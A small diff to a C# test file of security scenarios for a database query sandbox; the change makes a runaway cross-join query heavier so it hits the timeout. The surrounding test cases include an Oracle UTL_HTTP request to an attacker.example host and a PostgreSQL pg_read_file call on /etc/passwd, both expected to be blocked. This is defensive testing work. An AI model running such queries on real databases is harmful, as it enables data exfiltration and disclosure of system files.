@@ -44,7 +44,7 @@ public static partial class Scenarios
             oracle
                 ? new("ATK-10 network egress", "query", "SELECT UTL_HTTP.REQUEST('http://attacker.example/') FROM dual", "FunctionNotAllowed")
                 : new("ATK-06 server file read", "query", "SELECT pg_read_file('/etc/passwd')", "FunctionNotAllowed"),
-            new("runaway query hits the timeout", "query", "SELECT COUNT(*) FROM appointments a CROSS JOIN appointments b CROSS JOIN appointments c", "StatementTimeout"),
+            new("runaway query hits the timeout", "query", "SELECT COUNT(*) FROM appointments a CROSS JOIN appointments b CROSS JOIN appointments c WHERE a.status || b.department || c.status LIKE '%never%'", "StatementTimeout"),
         ];
     }
 
